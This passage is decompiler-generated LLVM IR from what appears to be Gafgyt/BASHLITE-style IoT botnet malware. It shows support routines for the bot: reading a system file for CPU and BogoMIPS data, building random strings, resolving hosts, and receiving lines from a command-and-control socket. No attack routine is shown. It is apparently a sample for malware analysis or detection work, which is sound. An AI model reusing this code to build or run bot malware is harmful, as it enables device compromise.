dec_label_pc_9430:                                ; preds = %entry
  %v1_9434 = add i32 %tmp8, 1
  %v3_9440 = inttoptr i32 %v1_9434 to i8*
  %v4_9440 = call i32 @wildString(i8* %v3_9440, i32 %arg2)
  %v2_9448 = icmp eq i32 %v4_9440, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9430
  %v2_9454 = load i8, i8* %tmp, align 1
  %v2_9458 = icmp eq i8 %v2_9454, 0
  br i1 %v2_9458, label %dec_label_pc_9494, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9450
  %v1_9464 = add i32 %arg2, 1
  %v4_9470 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9464)
  %v2_9478 = icmp eq i32 %v4_9470, 0
  br i1 %v2_9478, label %dec_label_pc_948c, label %dec_label_pc_9494

dec_label_pc_948c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9430
  br label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9460, %dec_label_pc_948c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_948c ], [ 1, %dec_label_pc_9460 ], [ 1, %dec_label_pc_9450 ]
  br label %dec_label_pc_956c

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9404
  %v2_94a4 = load i8, i8* %tmp, align 1
  %v2_94a8 = icmp eq i8 %v2_94a4, 0
  br i1 %v2_94a8, label %dec_label_pc_94ec, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a0
  %v1_94b4 = add i32 %tmp8, 1
  %v1_94bc = add i32 %arg2, 1
  %v2_94c8 = inttoptr i32 %v1_94b4 to i8*
  %v3_94c8 = call i32 @wildString(i8* %v2_94c8, i32 %v1_94bc)
  %v2_94d0 = icmp ne i32 %v3_94c8, 0
  %. = zext i1 %v2_94d0 to i32
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94b0, %dec_label_pc_94a0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94a0 ], [ %., %dec_label_pc_94b0 ]
  br label %dec_label_pc_956c

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9410
  %v2_94fc = load i8, i8* %arg1, align 1
  %v3_94fc = zext i8 %v2_94fc to i32
  %v1_9504 = call i32 @__GI_toupper(i32 %v3_94fc)
  store i32 %v1_9504, i32* @r4, align 4
  %v2_9510 = load i8, i8* %tmp, align 1
  %v3_9510 = zext i8 %v2_9510 to i32
  %v1_9518 = call i32 @__GI_toupper(i32 %v3_9510)
  %v0_9520 = load i32, i32* @r4, align 4
  %v9_9520 = icmp eq i32 %v0_9520, %v1_9518
  br i1 %v9_9520, label %dec_label_pc_9528, label %dec_label_pc_9564

dec_label_pc_9528:                                ; preds = %dec_label_pc_94f8
  %v1_952c = add i32 %tmp8, 1
  %v1_9534 = add i32 %arg2, 1
  %v2_9540 = inttoptr i32 %v1_952c to i8*
  %v3_9540 = call i32 @wildString(i8* %v2_9540, i32 %v1_9534)
  %v2_9548 = icmp ne i32 %v3_9540, 0
  %.7 = zext i1 %v2_9548 to i32
  br label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9528, %dec_label_pc_94f8
  %storemerge = phi i32 [ 1, %dec_label_pc_94f8 ], [ %.7, %dec_label_pc_9528 ]
  br label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9494, %dec_label_pc_9420, %dec_label_pc_9564
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9494 ], [ %storemerge2, %dec_label_pc_94ec ], [ %v3_9424, %dec_label_pc_9420 ], [ %storemerge, %dec_label_pc_9564 ]
  store i32 %v3_93d8, i32* @r4, align 4
  store i32 %v6_93d8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_956c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9494, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95a0, i32* %arg2, align 4
  %v3_95b8 = icmp eq i32 %v1_95a0, -1
  %. = zext i1 %v3_95b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_95f8 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_95f8 to i8*
  %v2_96303 = load i8, i8* %storemerge2, align 1
  %v2_96345 = icmp eq i8 %v2_96303, 0
  br i1 %v2_96345, label %dec_label_pc_963c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %entry, %dec_label_pc_9600
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9600 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9624, %dec_label_pc_9600 ], [ %v0_95f8, %entry ]
  %v2_9604 = load i8, i8* %storemerge7, align 1
  %v3_9604 = zext i8 %v2_9604 to i32
  store i32 %v3_9604, i32* %r0.global-to-local, align 4
  %v1_960c = call i32 @__GI_toupper(i32 %v3_9604)
  store i32 %v1_960c, i32* %r0.global-to-local, align 4
  %v1_961c = trunc i32 %v1_960c to i8
  store i8 %v1_961c, i8* %storemerge7, align 1
  %v1_9624 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9624 to i8*
  %v2_9630 = load i8, i8* %storemerge, align 1
  %v2_9634 = icmp eq i8 %v2_9630, 0
  br i1 %v2_9634, label %dec_label_pc_962c.dec_label_pc_963c_crit_edge, label %dec_label_pc_9600

dec_label_pc_962c.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9600
  %v1_9644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_963c

dec_label_pc_963c:                                ; preds = %dec_label_pc_962c.dec_label_pc_963c_crit_edge, %entry
  %v1_9644 = phi i32 [ %v1_9644.pre, %dec_label_pc_962c.dec_label_pc_963c_crit_edge ], [ %v0_95f8, %entry ]
  ret i32 %v1_9644

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9624, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_95f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9600, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_9664 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_9664, i32* @r2, align 4
  %v3_9674 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1ffb4.44 to i32), i32 0)
  %v2_982c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_9694 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_9824

dec_label_pc_9684:                                ; preds = %dec_label_pc_9824
  %v2_9694 = call i32 @uppercase(i8* %v1_9694)
  %v4_96ac = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ffc4.46, i32 0, i32 0))
  %v9_96c4 = icmp eq i32 %v4_96ac, %v2_982c
  br i1 %v9_96c4, label %dec_label_pc_96cc, label %dec_label_pc_9808

dec_label_pc_96cc:                                ; preds = %dec_label_pc_9684
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96e4:                                ; preds = %dec_label_pc_9710, %dec_label_pc_9700, %dec_label_pc_96f0
  %v1_96e8 = add i32 %v4_96f0, 1
  %v5_96ec = inttoptr i32 %v1_96e8 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96f0:                                ; preds = %dec_label_pc_96cc, %dec_label_pc_96e4
  %storemerge2 = phi i8* [ %v5_96ec, %dec_label_pc_96e4 ], [ %tmp21, %dec_label_pc_96cc ]
  %v4_96f0 = ptrtoint i8* %storemerge2 to i32
  %v2_96f4 = load i8, i8* %storemerge2, align 1
  %v7_96f8 = icmp eq i8 %v2_96f4, 32
  br i1 %v7_96f8, label %dec_label_pc_96e4, label %dec_label_pc_9700

dec_label_pc_9700:                                ; preds = %dec_label_pc_96f0
  %v2_9704 = load i8, i8* %storemerge2, align 1
  %v7_9708 = icmp eq i8 %v2_9704, 9
  br i1 %v7_9708, label %dec_label_pc_96e4, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9700
  %v2_9714 = load i8, i8* %storemerge2, align 1
  %v7_9718 = icmp eq i8 %v2_9714, 58
  br i1 %v7_9718, label %dec_label_pc_96e4, label %dec_label_pc_9748.preheader

dec_label_pc_9748.preheader:                      ; preds = %dec_label_pc_9710
  %v1_974c = add i32 %v4_96f0, -1
  br label %dec_label_pc_9748

dec_label_pc_9724:                                ; preds = %dec_label_pc_9770, %dec_label_pc_9748
  %v3_9734 = call i32 @strlen(i8* %storemerge2)
  %v2_973c = add i32 %v1_974c, %v3_9734
  %v3_9744 = inttoptr i32 %v2_973c to i8*
  store i8 0, i8* %v3_9744, align 1
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %dec_label_pc_9748.preheader, %dec_label_pc_9724
  %v3_9758 = call i32 @strlen(i8* %storemerge2)
  %v2_9760 = add i32 %v1_974c, %v3_9758
  %v1_9764 = inttoptr i32 %v2_9760 to i8*
  %v2_9764 = load i8, i8* %v1_9764, align 1
  %v7_9768 = icmp eq i8 %v2_9764, 13
  br i1 %v7_9768, label %dec_label_pc_9724, label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9748
  store i32 %v1_974c, i32* @r4, align 4
  %v3_9780 = call i32 @strlen(i8* %storemerge2)
  %v0_9788 = load i32, i32* @r4, align 4
  %v2_9788 = add i32 %v0_9788, %v3_9780
  %v1_978c = inttoptr i32 %v2_9788 to i8*
  %v2_978c = load i8, i8* %v1_978c, align 1
  %v7_9790 = icmp eq i8 %v2_978c, 10
  br i1 %v7_9790, label %dec_label_pc_9724, label %dec_label_pc_9798

dec_label_pc_9798:                                ; preds = %dec_label_pc_9770
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97a4 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v2_97ac = icmp eq i32 %v2_97a4, 0
  br i1 %v2_97ac, label %dec_label_pc_97d0, label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_9798
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97c0 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v3_97cc = inttoptr i32 %v2_97c0 to i8*
  store i8 0, i8* %v3_97cc, align 1
  br label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_9798, %dec_label_pc_97b4
  store i32 %v4_96f0, i32* @r1, align 4
  %v2_97ec = inttoptr i32 %arg1 to i8*
  %v3_97ec = call i32 @strcpy(i8* %v2_97ec, i32 %v4_96f0)
  %v1_97f4 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9808:                                ; preds = %dec_label_pc_9684
  store i32 4096, i32* @r2, align 4
  %v3_9820 = call i32 @__GI_memset(i8* %v1_9694, i32 0)
  br label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %entry, %dec_label_pc_9808
  %v4_983c = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v3_9674, i32 %v2_982c)
  %v2_9844 = icmp eq i32 %v4_983c, 0
  br i1 %v2_9844, label %dec_label_pc_984c, label %dec_label_pc_9684

dec_label_pc_984c:                                ; preds = %dec_label_pc_9824
  %v1_9850 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9860:                                ; preds = %dec_label_pc_97d0, %dec_label_pc_984c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_984c ], [ 0, %dec_label_pc_97d0 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_974c, { 2, 1, 0 }
  uselistorder i32 %v4_96f0, { 3, 2, 1, 0, 5, 4, 6, 7 }
  uselistorder i8* %storemerge2, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder i32 %v3_9674, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9860, { 1, 0 }
  uselistorder label %dec_label_pc_9824, { 1, 0 }
  uselistorder label %dec_label_pc_97d0, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
  uselistorder label %dec_label_pc_96f0, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_9890 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_98a4 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1ffb4.44 to i32), i32 0)
  %v1_98c4 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9920

dec_label_pc_98b4:                                ; preds = %dec_label_pc_9920
  %v2_98c4 = call i32 @uppercase(i8* %v1_98c4)
  %v4_98dc = call i32 @strstr(i32 %v2_9890, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ffc4.46, i32 0, i32 0))
  %v9_98f0 = icmp eq i32 %v4_98dc, %v2_9890
  br i1 %v9_98f0, label %dec_label_pc_98f8, label %dec_label_pc_9904

dec_label_pc_98f8:                                ; preds = %dec_label_pc_98b4
  %v1_98fc = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9904

dec_label_pc_9904:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_98f8
  %stack_var_-24.0 = phi i32 [ %v1_98fc, %dec_label_pc_98f8 ], [ %stack_var_-24.1, %dec_label_pc_98b4 ]
  store i32 4096, i32* @r2, align 4
  %v3_991c = call i32 @__GI_memset(i8* %v1_98c4, i32 0)
  br label %dec_label_pc_9920

dec_label_pc_9920:                                ; preds = %entry, %dec_label_pc_9904
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9904 ]
  %v4_9938 = call i32 @fdgets(i32 %v2_9890, i32 4096, i32 %v3_98a4, i32 %v2_9890)
  %v2_9940 = icmp eq i32 %v4_9938, 0
  br i1 %v2_9940, label %dec_label_pc_9948, label %dec_label_pc_98b4

dec_label_pc_9948:                                ; preds = %dec_label_pc_9920
  %v1_994c = call i32 @__GI_close(i32 %v3_98a4)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_9890, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9920, { 1, 0 }
  uselistorder label %dec_label_pc_9904, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_9970 = load i32, i32* @r4, align 4
  %v6_9970 = load i32, i32* @fp, align 4
  %v0_997c = load i32, i32* %r0.global-to-local, align 4
  %v5_9a1024 = icmp sgt i32 %arg2, 0
  br i1 %v5_9a1024, label %dec_label_pc_9998, label %dec_label_pc_9a14

dec_label_pc_9998:                                ; preds = %entry, %dec_label_pc_9998
  %storemerge725 = phi i32 [ %v1_99fc, %dec_label_pc_9998 ], [ 0, %entry ]
  %v2_99a4 = add i32 %storemerge725, %v0_997c
  store i32 %v2_99a4, i32* @r4, align 4
  %v0_99a8 = call i32 @rand_cmwc()
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v3_99b8 = udiv i32 %v0_99a8, 26
  %tmp = mul nsw i32 %v3_99b8, -2
  %v2_99dc = add i32 %v0_99a8, %tmp
  %fold = add i32 %v2_99dc, 65
  %v1_99f4 = trunc i32 %fold to i8
  %v2_99f4 = load i32, i32* @r4, align 4
  %v3_99f4 = inttoptr i32 %v2_99f4 to i8*
  store i8 %v1_99f4, i8* %v3_99f4, align 1
  %v1_99fc = add nuw nsw i32 %storemerge725, 1
  %v5_9a10 = icmp slt i32 %v1_99fc, %arg2
  br i1 %v5_9a10, label %dec_label_pc_9998, label %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge

dec_label_pc_9a04.dec_label_pc_9a14_crit_edge:    ; preds = %dec_label_pc_9998
  %v1_9a1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a14

dec_label_pc_9a14:                                ; preds = %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge, %entry
  %v1_9a1c = phi i32 [ %v1_9a1c.pre, %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge ], [ %v0_997c, %entry ]
  store i32 %v3_9970, i32* @r4, align 4
  store i32 %v6_9970, i32* @fp, align 4
  ret i32 %v1_9a1c

; uselistorder directives
  uselistorder i32 %v1_99fc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9998, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a78.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a28 = load i32, i32* @fp, align 4
  store i32 %v3_9a28, i32* %stack_var_-16, align 4
  store i32 39472, i32* %stack_var_-4, align 4
  %v2_9a2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a2c, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9a50 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9a64 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9a78

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9a78.lr.ph, %dec_label_pc_9a78
  %storemerge527 = phi i32 [ 0, %dec_label_pc_9a78.lr.ph ], [ %v1_9a8c, %dec_label_pc_9a78 ]
  %v5_9a84 = mul nuw nsw i32 %storemerge527, 4
  %v6_9a84 = add i32 %v5_9a84, %v2_9a64
  %v7_9a84 = inttoptr i32 %v6_9a84 to i32*
  store i32 0, i32* %v7_9a84, align 4
  %v1_9a8c = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_9a8c, 32
  br i1 %tmp52, label %dec_label_pc_9a78, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a78
  %v13_9a28 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9aa4 = udiv i32 %arg1, 32
  %v3_9ab0 = mul nuw nsw i32 %v3_9aa4, 4
  %v2_9ab8 = add nsw i32 %v3_9ab0, -160
  %v2_9abc = add i32 %v2_9ab8, %v13_9a28
  %v1_9ac0 = inttoptr i32 %v2_9abc to i32*
  %v2_9ac0 = load i32, i32* %v1_9ac0, align 4
  %v1_9ac8 = urem i32 %arg1, 32
  %v6_9ad0 = shl i32 1, %v1_9ac8
  %v2_9ad4 = or i32 %v2_9ac0, %v6_9ad0
  store i32 %v2_9ad4, i32* %v1_9ac0, align 4
  %v1_9af4 = add i32 %arg1, 1
  %v2_9b00 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9b14 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9b28 = icmp sgt i32 %v5_9b14, 0
  br i1 %v5_9b28, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c28.preheader

dec_label_pc_9c28.preheader:                      ; preds = %dec_label_pc_9aa0
  %v7_9c3023 = icmp slt i32 %tmp33, 10
  br i1 %v7_9c3023, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9b68.lr.ph:                          ; preds = %dec_label_pc_9c28.preheader, %dec_label_pc_9c1c
  %stack_var_-44.024 = phi i32 [ %v1_9c20, %dec_label_pc_9c1c ], [ %tmp33, %dec_label_pc_9c28.preheader ]
  %v2_9b34 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_9b40 = call i32 @HackerPrint(i32 %v2_9b34, i32 ptrtoint ([5 x i8]* @global_var_1ffd0.55 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9b68.lr.ph, %dec_label_pc_9b68
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9b68.lr.ph ], [ %v1_9b7c, %dec_label_pc_9b68 ]
  %v5_9b74 = mul nuw nsw i32 %storemerge615, 4
  %v6_9b74 = add i32 %v5_9b74, %v2_9a64
  %v7_9b74 = inttoptr i32 %v6_9b74 to i32*
  store i32 0, i32* %v7_9b74, align 4
  %v1_9b7c = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9b7c, 32
  br i1 %tmp53, label %dec_label_pc_9b68, label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %dec_label_pc_9b68
  %v2_9bb0 = load i32, i32* %v1_9ac0, align 4
  %v2_9bc4 = or i32 %v2_9bb0, %v6_9ad0
  store i32 %v2_9bc4, i32* %v1_9ac0, align 4
  store i32 0, i32* @r2, align 4
  %v5_9c04 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9c18 = icmp sgt i32 %v5_9c04, 0
  br i1 %v5_9c18, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9b90
  %v1_9c20 = add nsw i32 %stack_var_-44.024, 1
  %v7_9c30 = icmp slt i32 %v1_9c20, 10
  br i1 %v7_9c30, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9cbc.preheader:                      ; preds = %dec_label_pc_9c1c, %dec_label_pc_9b90, %dec_label_pc_9c28.preheader, %dec_label_pc_9aa0
  %v2_9c50 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_9cc457 = icmp sgt i32 %arg3, 1
  %v2_9cdc59 = icmp eq i1 %not.v7_9cc457, false
  br i1 %v2_9cdc59, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9cbc.preheader, %dec_label_pc_9cb0
  %v1_9cc062.in = phi i32 [ %v1_9cc062, %dec_label_pc_9cb0 ], [ %arg3, %dec_label_pc_9cbc.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %arg2, %dec_label_pc_9cbc.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9cb4, %dec_label_pc_9cb0 ], [ 0, %dec_label_pc_9cbc.preheader ]
  %v1_9cc062 = add i32 %v1_9cc062.in, -1
  %v2_9c4c = load i32, i32* @global_var_2e4e0.53, align 4
  %v5_9c64 = call i32 @__libc_recv(i32 %v2_9c4c, i32 %v2_9c50, i32 1, i32 0, i32 %v1_9cc062)
  %v7_9c6c = icmp eq i32 %v5_9c64, 1
  br i1 %v7_9c6c, label %dec_label_pc_9c8c, label %dec_label_pc_9c74

dec_label_pc_9c74:                                ; preds = %dec_label_pc_9c48
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9c8c:                                ; preds = %dec_label_pc_9c48
  %v3_9c8c = load i8, i8* %stack_var_-185, align 1
  %v4_9c90 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9c8c, i8* %stack_var_-40.061, align 1
  %v1_9c9c = add i32 %v4_9c90, 1
  %v5_9ca0 = inttoptr i32 %v1_9c9c to i8*
  %v3_9ca4 = load i8, i8* %stack_var_-185, align 1
  %v7_9ca8 = icmp eq i8 %v3_9ca4, 10
  br i1 %v7_9ca8, label %dec_label_pc_9ce4, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %dec_label_pc_9c8c
  %v1_9cb4 = add i32 %stack_var_-36.060, 1
  %not.v7_9cc4 = icmp sgt i32 %v1_9cc062, 1
  %v2_9cdc = icmp eq i1 %not.v7_9cc4, false
  br i1 %v2_9cdc, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9c8c, %dec_label_pc_9cb0, %dec_label_pc_9cbc.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9cbc.preheader ], [ %v1_9cb4, %dec_label_pc_9cb0 ], [ %stack_var_-36.060, %dec_label_pc_9c8c ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9cbc.preheader ], [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %v5_9ca0, %dec_label_pc_9c8c ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9c74, %dec_label_pc_9ce4
  %storemerge = phi i32 [ -1, %dec_label_pc_9c74 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9ce4 ]
  %v2_9d04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9d04, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9cc062, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9c20, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_9a64, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cf8, { 1, 0 }
  uselistorder label %dec_label_pc_9ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9c48, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 1, 0 }
  uselistorder label %dec_label_pc_9b68.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40224, i32* %stack_var_-4, align 4
  %v2_9d1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d1c, i32* @fp, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_9d30 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_9d40 = icmp eq i32 %v1_9d30, 0
  br i1 %v2_9d40, label %dec_label_pc_9d48, label %dec_label_pc_9d5c

dec_label_pc_9d48:                                ; preds = %entry
  %v3_9d4c = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1ffd8.57, i32 0, i32 0))
  br label %dec_label_pc_9dd4

dec_label_pc_9d5c:                                ; preds = %entry
  %v1_9d60 = add i32 %v1_9d30, 16
  %v2_9d60 = inttoptr i32 %v1_9d60 to i32*
  %v3_9d60 = load i32, i32* %v2_9d60, align 4
  %v1_9d84 = inttoptr i32 %v3_9d60 to i32*
  %v2_9d84 = load i32, i32* %v1_9d84, align 4
  %v2_9d88 = icmp eq i32 %v2_9d84, 0
  br i1 %v2_9d88, label %dec_label_pc_9dcc, label %dec_label_pc_9d90

dec_label_pc_9d90:                                ; preds = %dec_label_pc_9d5c
  %v2_9da4 = load i32, i32* %v1_9d84, align 4
  %v1_9da8 = inttoptr i32 %v2_9da4 to i32*
  %v2_9da8 = load i32, i32* %v1_9da8, align 4
  store i32 %v2_9da8, i32* @r0, align 4
  %v1_9dac = call i32 @__GI_inet_ntoa(i32 %v2_9da8)
  store i32 %v1_9dac, i32* @r1, align 4
  %v2_9dbc = inttoptr i32 %arg2 to i8*
  %v3_9dbc = call i32 @strcpy(i8* %v2_9dbc, i32 %v1_9dac)
  br label %dec_label_pc_9dd4

dec_label_pc_9dcc:                                ; preds = %dec_label_pc_9d5c
  br label %dec_label_pc_9dd4

dec_label_pc_9dd4:                                ; preds = %dec_label_pc_9d90, %dec_label_pc_9d48, %dec_label_pc_9dcc
  %stack_var_-44.0 = phi i32 [ 1, %dec_label_pc_9d48 ], [ 1, %dec_label_pc_9dcc ], [ 0, %dec_label_pc_9d90 ]
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9dd4, { 2, 0, 1 }
}

